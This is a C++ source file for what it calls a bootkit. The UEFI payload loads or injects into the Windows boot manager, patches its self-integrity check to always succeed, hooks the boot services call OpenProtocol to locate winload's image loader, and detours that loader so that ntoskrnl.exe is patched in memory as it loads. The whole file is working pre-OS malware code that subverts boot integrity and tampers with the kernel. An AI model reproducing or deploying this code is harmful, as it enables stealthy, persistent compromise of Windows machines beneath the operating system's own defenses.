#include "Efi.hpp"
#include "PatchNtoskrnl.hpp"

static bool IsNtoskrnl(const wchar_t* ImageName)
{
    constexpr wchar_t Ntoskrnl[] = L"ntoskrnl.exe";
    constexpr size_t NtoskrnlLen = ARRAY_SIZE(Ntoskrnl) - 1;

    auto ImageNameLen = wcslen(ImageName);
    if (ImageNameLen < NtoskrnlLen)
    {
        return false;
    }

    return memcmp(&ImageName[ImageNameLen - NtoskrnlLen], Ntoskrnl, NtoskrnlLen * sizeof(wchar_t)) == 0;
}

typedef EFI_STATUS (*BlImgLoadPEImageEx_t)(void*, void*, wchar_t*, void**, uint64_t*, void*, void*, void*, void*, void*, void*, void*, void*, void*);
static BlImgLoadPEImageEx_t BlImgLoadPEImageEx = nullptr;
static uint8_t BlImgLoadPEImageExOriginal[DetourSize];

static EFI_STATUS BlImgLoadPEImageExHook(void* a1, void* a2, wchar_t* LoadFile, void** ImageBase, uint64_t* ImageSize, void* a6, void* a7, void* a8, void* a9, void* a10, void* a11, void* a12, void* a13, void* a14)
{
    // Call original BlImgLoadPEImageEx
    DetourRestore(BlImgLoadPEImageEx, BlImgLoadPEImageExOriginal);

    auto Status =
        BlImgLoadPEImageEx(a1, a2, LoadFile, ImageBase, ImageSize, a6, a7, a8, a9, a10, a11, a12, a13, a14);

    DetourCreate(BlImgLoadPEImageEx, BlImgLoadPEImageExHook, BlImgLoadPEImageExOriginal);

    // Check if loaded file is ntoskrnl and patch it
    if (!EFI_ERROR(Status) && IsNtoskrnl(LoadFile))
    {
        PatchNtoskrnl(*ImageBase, *ImageSize);
    }

    return Status;
}

static EFI_OPEN_PROTOCOL OpenProtocol = nullptr;

static EFI_STATUS EFIAPI OpenProtocolHook(EFI_HANDLE Handle, EFI_GUID* Protocol, void** Interface, EFI_HANDLE AgentHandle, EFI_HANDLE ControllerHandle, uint32_t Attributes)
{
    auto Status = OpenProtocol(Handle, Protocol, Interface, AgentHandle, ControllerHandle, Attributes);

    // Find the calling module's image base
    if (auto ImageBase = FindImageBase((uint64_t)_ReturnAddress()))
    {
        // Find and hook BlImgLoadPEImageEx
        if (auto BlImgLoadPEImageExExport = GetExport(ImageBase, "BlImgLoadPEImageEx", "winload.sys"))
        {
            BlImgLoadPEImageEx = (BlImgLoadPEImageEx_t)BlImgLoadPEImageExExport;

            DetourCreate(BlImgLoadPEImageEx, BlImgLoadPEImageExHook, BlImgLoadPEImageExOriginal);

            // Restore original boot services
            gBS->OpenProtocol = OpenProtocol;
        }
    }

    return Status;
}

static void HookBootServices()
{
    // Hook open protocol (called via BlInitializeLibrary -> ... -> EfiOpenProtocol)
    OpenProtocol = gBS->OpenProtocol;
    gBS->OpenProtocol = OpenProtocolHook;
}

static void PatchSelfIntegrity(void* ImageBase, uint64_t ImageSize)
{
    /*
    bootmgfw!BmFwVerifySelfIntegrity
    .text:000000001002AE5C 89 4C 24 08           mov     [rsp-30h+arg_0], ecx
    .text:000000001002AE60 55                    push    rbp
    .text:000000001002AE61 53                    push    rbx
    .text:000000001002AE62 56                    push    rsi
    .text:000000001002AE63 57                    push    rdi
    .text:000000001002AE64 41 55                 push    r13
    .text:000000001002AE66 41 56                 push    r14
    .text:000000001002AE68 48 8B EC              mov     rbp, rsp
    .text:000000001002AE6B 48 83 EC 68           sub     rsp, 68h
    .text:000000001002AE6F 48 8B 05 FA 71 13 00  mov     rax, cs:BootDevice
    .text:000000001002AE76 33 FF                 xor     edi, edi
    .text:000000001002AE78 48 83 65 C8 00        and     qword ptr [rbp+Device.Type], 0
    .text:000000001002AE7D 48 83 65 48 00        and     [rbp+arg_10], 0
    We try to find this:
    .text:000000001002AE82 83 4D 38 FF           or      [rbp+arg_0], 0FFFFFFFFh
    .text:000000001002AE86 83 4D 40 FF           or      [rbp+a1], 0FFFFFFFFh
    */
    auto VerifySelfIntegrityMid = FIND_PATTERN(ImageBase, ImageSize, "\x83\x4D\xCC\xFF\x83\x4D\xCC\xFF");
    ASSERT(VerifySelfIntegrityMid != nullptr);

    auto BmFwVerifySelfIntegrity = FindFunctionStart(ImageBase, VerifySelfIntegrityMid);
    ASSERT(BmFwVerifySelfIntegrity != nullptr);

    PatchReturn0(BmFwVerifySelfIntegrity);
}

static EFI_STATUS LoadBootManager()
{
    // Query bootmgfw from the filesystem
    EFI_DEVICE_PATH* BootmgfwPath = nullptr;
    auto Status = EfiQueryDevicePath(L"\\EFI\\Microsoft\\Boot\\bootmgfw.efi", &BootmgfwPath);
    if (EFI_ERROR(Status))
    {
        return Status;
    }

    // Load the boot manager
    EFI_HANDLE BootmgfwHandle = nullptr;
    Status = gBS->LoadImage(TRUE, gImageHandle, BootmgfwPath, nullptr, 0, &BootmgfwHandle);
    gBS->FreePool(BootmgfwPath);
    if (EFI_ERROR(Status))
    {
        return Status;
    }

    // Install boot services hook
    HookBootServices();

    // Start the boot manager
    Status = gBS->StartImage(BootmgfwHandle, nullptr, nullptr);
    if (EFI_ERROR(Status))
    {
        gBS->UnloadImage(BootmgfwHandle);
    }

    return Status;
}

EFI_STATUS EFIAPI EfiEntry(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE* SystemTable)
{
    EfiInitializeGlobals(ImageHandle, SystemTable);

    // Get the EFI image base
    EFI_LOADED_IMAGE* EfiImage = nullptr;
    auto Status = gBS->HandleProtocol(ImageHandle, &gEfiLoadedImageProtocolGuid, (void**)&EfiImage);
    if (EFI_ERROR(Status))
    {
        return Status;
    }

    // Set the default error
    Status = EFI_UNSUPPORTED;

    // Check if we are currently running as an injected section
    auto ImageBase = &__ImageBase;
    if (EfiImage->ImageBase != ImageBase)
    {
        // Fix relocations manually
        auto NtHeaders = GetNtHeaders(ImageBase);
        auto NtImageBase = NtHeaders->OptionalHeader.ImageBase;
        auto OriginalImageSize = (uint8_t*)EfiImage->ImageBase - (uint8_t*)ImageBase;

        if (FixRelocations(ImageBase, (uint64_t)ImageBase - (uint64_t)NtImageBase))
        {
            // Patch self integrity checks
            PatchSelfIntegrity(EfiImage->ImageBase, OriginalImageSize);

            // Install boot services hook
            HookBootServices();

            // Call the original entry point (embedded in the bootkit PE)
            auto OriginalEntryRva = NtHeaders->OptionalHeader.AddressOfEntryPoint;
            auto OriginalEntry = RVA<decltype(&EfiEntry)>(EfiImage->ImageBase, OriginalEntryRva);

            Status = OriginalEntry(ImageHandle, SystemTable);
        }
    }
    // Relocate the image to a new base
    else if (auto NewImageBase = EfiRelocateImage(ImageBase))
    {
        // Call the relocated LoadBootManager
        auto RelocLoadBootManagerRva = ((uint64_t)&LoadBootManager - (uint64_t)ImageBase);
        auto RelocLoadBootManager = RVA<decltype(&LoadBootManager)>(NewImageBase, RelocLoadBootManagerRva);

        Status = RelocLoadBootManager();
    }

    return Status;
}
